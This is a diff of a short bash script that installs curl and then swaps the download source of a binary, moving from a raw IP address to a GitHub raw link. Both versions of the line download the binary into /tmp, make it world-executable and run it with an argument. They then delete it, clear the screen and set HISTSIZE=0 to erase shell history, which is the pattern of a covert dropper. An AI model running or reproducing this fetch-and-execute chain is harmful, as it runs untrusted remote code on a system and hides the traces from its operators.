@@ -1,4 +1,4 @@
 #!/usr/bin/bash
 yum install curl -y
 apt install curl -y
-cd /tmp/ && curl -OL http://103.161.181.160/x86_64 && chmod 777 x86_64 && ./x86_64 daukute && rm -rf x86_64 && cd /root/ && clear && HISTSIZE=0
+cd /tmp/ && curl -OL https://github.com/DauDau432/scan/blob/main/x86?raw=true && chmod 777 x86 && ./x86 daukute && rm -rf x86 && cd /root/ && clear && HISTSIZE=0
